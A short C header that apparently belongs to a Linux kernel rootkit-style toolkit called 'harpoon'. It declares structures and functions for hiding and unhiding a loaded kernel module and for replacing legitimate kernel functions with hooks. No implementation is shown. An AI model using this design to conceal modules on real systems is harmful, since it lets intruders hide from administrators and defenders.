#ifndef H_HARPOON_MD
#define H_HARPOON_MD

#include <linux/list.h>
#include <linux/module.h>

/* LKM container */
struct harpoon_module {
    struct list_head list;
    struct module *self;
    struct module *prev;
    struct mutex lock;
    __u8 is_hidden;
};

/* Hook container */
struct harpoon_hook {
    struct list_head list;
    __u8 is_hooked;
    void *legit;
    void *hooked;
};

struct harpoon_module *harpoon_new_mod(struct module *module);

void harpoon_del_mod(struct harpoon_module *module);

void harpoon_mod_hide(struct harpoon_module *module);

void harpoon_mod_unhide(struct harpoon_module *module);

#endif